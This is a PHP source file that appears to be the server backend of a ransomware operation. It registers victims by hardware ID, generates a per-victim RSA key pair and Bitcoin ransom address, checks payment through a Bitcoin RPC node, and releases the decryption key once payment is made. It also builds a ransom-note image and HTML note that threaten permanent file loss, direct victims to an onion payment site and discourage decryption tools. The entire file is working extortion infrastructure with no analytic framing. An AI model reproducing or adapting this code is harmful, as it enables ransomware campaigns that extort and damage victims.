<?php



require_once 'api/RPC/includes/jsonRPCClient.php'; 
$bitcoin = new jsonRPCClient('http://root:passhere@127.0.0.1:8332/');

    $dsn = 'mysql:host=localhost;dbname=db'; // define host name and database name
    $username = 'root'; // define the username
    $pwd='passhere'; // password
    try {
        $db = new PDO($dsn, $username, $pwd);
    }
    catch (PDOException $e) {
        $error_message = $e->getMessage();
        echo "error";
        
	}




function usd2btc($usd){
$content = file_get_contents("https://bitpay.com/api/rates");
if($content){
    $price = json_decode($content, true)[1]["rate"];
    if($price != 0 && $usd != 0){
    return $usd / $price;
    }
    else{
        return "";
    }
}
else{
    return "";
}
}

function get_unique_id()
{
    $strong_crypto = true;
    $random_bytes = openssl_random_pseudo_bytes(rand(55, 70), $strong_crypto);
    $safe_characters = "abcdefghijklmnopqrstuvwxyzABDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    $safestring = "";
    for ($i = 0; $i < strlen($random_bytes); $i++) {
        $safestring .= $safe_characters[ord($random_bytes[$i]) % (strlen($safe_characters) - 1)];
    }
    return $safestring;
}

function imageCenterString(&$img, $font, $text, $color, $y)
{
    if($font < 0 || $font > 5){ $font = 0; }
    $num = array(array(4.6, 6),
                 array(4.6, 6),
                 array(5.6, 12),
                 array(6.5, 12),
                 array(7.6, 16),
                 array(8.5, 16));
    $width = ceil(strlen($text) * $num[$font][0]);
    $x     = imagesx($img) - $width - 8;
    imagestring($img, $font, $x/2, $y/2, $text, $color);
}

if(!empty($_GET['hwid']) && !empty($_GET['ip']) && !empty($_GET['amount']) && !empty($_GET['camp'])){
// 
	
	$note = "lol";
	$hwid = $_GET['hwid'];
	$paiz = "paid";
	
	

	$checkhwid = "SELECT * FROM `ransomware` WHERE `hwid` = :hwid";
	if($sth = $db->prepare($checkhwid)){
		$sth->bindParam(":hwid", $hwid);
		$sth->execute();
		if($sth->rowCount() > 0){
 		while( $row = $sth->fetch(PDO::FETCH_ASSOC) ) {
                header('Content-Type: application/json');
                $pubkey = trim($row["public"]);
        if($row["paid"] == $paiz){
				print json_encode(array("key"=> $row["key"], "message" => "", "extensions"=>array(".LADON"), "status"=>"paid", "image"=>"", "debug"=>array("MALWAREHUNTERTEAM.exe"), "blacklist"=>array("Windows"), "contactid"=>$row["contactid"]));	
		}

		else if($bitcoin->getreceivedbyaddress($row["address"]) >= usd2btc($row["amount"])){
			
            $udp = "UPDATE `ransomware` SET `paid` = :paid WHERE `hwid` = :hwid";
            if($sth = $db->prepare($udp)){
                $sth->bindParam(":paid", $paiz);
                $sth->bindParam(":hwid", $hwid);
                $sth->execute();
            
            	header('Content-Type: application/json');
				print json_encode(array("key"=> $row["key"], "message" => "", "extensions"=>array(".LADON"), "status"=>"paid", "image"=>"", "debug"=>array("MALWAREHUNTERTEAM.exe"), "blacklist"=>array("Windows"), "contactid"=>$row["contactid"]));	
			}
		}
		else{

			



			$ext = array();
			  $exte = "SELECT `extension` FROM `extensions` WHERE `username` = :username ";
            if($sth = $db->prepare($exte)){
                $sth->bindParam(":username", $useraddr);
                $sth->execute();
                if($sth->rowCount() > 0 ){
                	while( $row = $sth->fetch(PDO::FETCH_ASSOC) ) {
                		array_push($ext, $row["extension"]);
                	}
                }
         }
			print json_encode(array("key"=> $row["key"], "message" => "" , "extensions"=> $ext, "status"=>"unpaid", "image"=>"", "debug"=>array("MALWAREHUNTERTEAM.exe"), "blacklist"=>array("Windows"), "contactid"=>$row["contactid"]));	
		
		}
		}
		}


		else{
		$checkuser = "SELECT * FROM `users` WHERE `id` = :id";
		if($sth = $db->prepare($checkuser)){

			$useraddr = "";
			$camp = $_GET['camp'];

			$sth->bindParam(":id", $camp);
			$sth->execute();
			if($sth->rowCount() > 0){
			while( $row = $sth->fetch(PDO::FETCH_ASSOC) ) {
			$useraddr = $row["username"];	
			}

			$ip = $_GET['ip'];
			$amount = $_GET['amount'];

			$address = $bitcoin->getnewaddress($useraddr);
			$contactid = get_unique_id();


			$pknew = openssl_pkey_new(array(
				'private_key_bits' => 2048,
				'private_key_type' => OPENSSL_KEYTYPE_RSA
			));
			 
			openssl_pkey_export($pknew,$private); 

			$keys = openssl_pkey_get_details($pknew);
			$public = $keys['key'];
			openssl_pkey_free($pknew);



			$debug = array();
			$debugz = "SELECT `debug` FROM `debug` WHERE `username` = :user ";
			if($szmt = $db->prepare($debugz)){
			$szmt->bindParam(":user", $useraddr);
			$szmt->execute();
			  if($szmt->rowCount() > 0){
			    $debug = $szmt->fetchAll(PDO::FETCH_COLUMN);
			  }
			}



			$blacklist = array();

			$blacks = "SELECT `directory` FROM `blacklist` WHERE `username` = :user ";
			if($stmt = $db->prepare($blacks)){
			$stmt->bindParam(":user", $useraddr);
			$stmt->execute();
			  if($sth->rowCount() > 0){
			    $blacklist = $stmt->fetchAll(PDO::FETCH_COLUMN);
			  }
			}


			$extension = array();
			  $ext = "SELECT `extension` FROM `extensions` WHERE `username` = :user ";
            if($dgst = $db->prepare($ext)){
                $dgst->bindParam(":user", $useraddr);
                $dgst->execute();
                if($dgst->rowCount() > 0 ){
                	$extension = $dgst->fetchAll(PDO::FETCH_COLUMN);
                }
        
         }



$firstquestion = "What happened to my files?";
$firstanswer = "Your files have been encrypted using military-grade encryption. ";
$firstanswerz = "In order to retrieve them you must pay a small fee. This fee is not very large and can range from 200-300$";
$firstanswer1 = "Failure to pay the fee will result in the loss of your files.";
$firstanswer2 = "Once a payment is received and verified your files will be released to you. Payment will only be accepted ";
$firstanswer3 = "in a digital currency known as Bitcoin. For a guide on how to buy this online, check out http://www.paxful.com.";
$secondquestion = "How do I get my files back?";
$secondanswer = "First open the file on your desktop called READ_ME.html. ";
$secondanswer1 = "If it does not exist, Please check if your antiviurs has removed it.";
$secondanswer2 = "If your antivirus has removed it, you must get it back in order to retrieve your files!";
$secondanswer3 = "Without that document or this image, your files are lost forever!";
$secondanswer4 = "Your bitcoin address is: ".$address;
$secondanswer5 = "The amount you must pay is: ".$amount;
$secondanswer6 = "Your contact ID is: ".$contactid;
$secondanswer7 = "The website login is: http://ns2yrncquekngvfe.onion.casa/";
$secondanswer8 = "To access the link you need a special browser called TOR, or any browser for now can work. If you cannot access the website please use TOR.";
$secondanswer9 = "You can download TOR from https://www.torproject.org/projects/torbrowser.html.en ";
$secondanswer10= "Or http://ns2yrncquekngvfe.onion.casa/tor.exe";
$secondanswer11 = "Please follow the READ_ME.txt file on Desktop for further instructions";


$width = 1080;
$height = 600;
$my_img = imagecreate( $width, $height );                            
$background  = imagecolorallocate( $my_img, 0,   0,   255 );
$text_colour = imagecolorallocate( $my_img, 0, 0, 0 );
$line_colour = imagecolorallocate( $my_img, 128, 255, 0 );


imageCenterString( $my_img, 5,  $firstquestion, $text_colour, 50 );
imageCenterString( $my_img, 5,  $firstanswer, $text_colour, 100 );
imageCenterString( $my_img, 5, $firstanswerz, $text_colour, 150 );
imageCenterString( $my_img, 5, $firstanswer1, $text_colour, 200 );	
imageCenterString( $my_img, 5, $firstanswer2, $text_colour, 250 );
imageCenterString( $my_img, 5, $firstanswer3, $text_colour, 300 );
imageCenterString( $my_img, 5,  $secondquestion, $text_colour, 450 );
imageCenterString( $my_img, 5,  $secondanswer, $text_colour, 500 );
imageCenterString( $my_img, 5, $secondanswer1, $text_colour, 550 );
imageCenterString( $my_img, 5, $secondanswer2, $text_colour, 600 );	
imageCenterString( $my_img, 5, $secondanswer3, $text_colour, 650 );
imageCenterString( $my_img, 5, $secondanswer4, $text_colour, 800 );
imageCenterString( $my_img, 5, $secondanswer5, $text_colour, 850 );
imageCenterString( $my_img, 5, $secondanswer6, $text_colour, 900 );
imageCenterString( $my_img, 5, $secondanswer7, $text_colour, 950 );
imageCenterString( $my_img, 5, $secondanswer8, $text_colour, 1000 );
imageCenterString( $my_img, 5, $secondanswer9, $text_colour, 1050 );
imageCenterString( $my_img, 5, $secondanswer10, $text_colour, 1100 );
imageCenterString( $my_img, 5, $secondanswer11, $text_colour, 1150 );
imagesetthickness ( $my_img, 5 );
ob_start();
imagepng($my_img);
$imagedata = ob_get_contents();
imagecolordeallocate( $my_img, $line_colour );
imagecolordeallocate( $my_img, $text_colour );
imagecolordeallocate( $my_img, $background );
imagedestroy( $my_img );   
ob_end_clean();
$imgdat = bin2hex($imagedata);
$note = "<!DOCTYPE html><html><body><center><h3>What happened to my files?</h3><p>Your files are encrypted with strong, military-grade encryption. In order to recover them you must pay a fee. This fee is not very large and can range from 100-300$. Failure to pay the fee will result in the loss of your files. There is no deadline for when you can pay.<h3>How can I trust you?</h3><p>Your files will be recovered immediately after our service detects that you have paid. In order to allow this, please allow our program to continue running so that it can retrieve your files. We can help and provide assistance in chat to those who need it. (NOTE: We do not respond to requests to lower the fee.)<h3>How can I pay?</h3><p>We only accept a form of digital currency known as Bitcoin. There are many guides on how to buy this online, which you can find from googling. If you want to buy bitcoin using paypal, giftcard, and other forms of payment, then http://www.paxful.com is a great and easy way. </p><h3>How do I decrypt My Files?</h3><p>Your CONTACTID is: ".$contactid." Keep this in a safe location. Without the contactid your files are lost forever! Now using your contactid open up your browser go visit http://ns2yrncquekngvfe.onion.casa . From there simply log in, pay and you will get your files back.</p><h3>I have paid, how long will it take?</h3><p>Once you pay, it depends on how long it takes for the transaction to verify. This can be 1 minute - 1 day. <h3>How do I remove this program once I have retrieved my files?</h3><p>The program will remove itself from your computer. You are welcome to try an antivirus or any other program to confirm our claim.</p><h3>Is there any program or any other way to recover my files?</h3><p>There is no possible way to recover your files without paying us. Any attempt to use any decryptors/tools may permanently damage your files!</p></center></body></html>";


					$inserta = "INSERT INTO `ransomware` (`username`, `ip`, `hwid`, `contactid`, `address`, `amount`, `day`, `key`, `public`, `paid`) VALUES (:username, :ip, :hwid, :contactid, :address, :amount, NOW(), :key, :public, 'No')";
					if($sth = $db->prepare($inserta)){

						$sth->bindParam(":username", $useraddr);
						$sth->bindParam(":ip", $ip);
						$sth->bindParam(":hwid", $hwid);
						$sth->bindParam(":contactid", $contactid);
						$sth->bindParam(":address", $address);
						$sth->bindParam(":amount", $amount);
						$sth->bindParam(":key", $private);
						$sth->bindParam(":public", $public);
						$sth->execute();
						header('Content-Type: application/json');
						print json_encode(array("key" => trim($public),  "message" => $note, "extensions" => $extension, "status"=>"unpaid", "image"=>$imgdat, "debug"=>$debug, "blacklist"=>$blacklist, "contactid"=>$contactid));

					}
					else{
		// failed insert
					}
			}
			else{
//user campagin is not valid
			}
		}
	}
	}




}


else{

}



?>

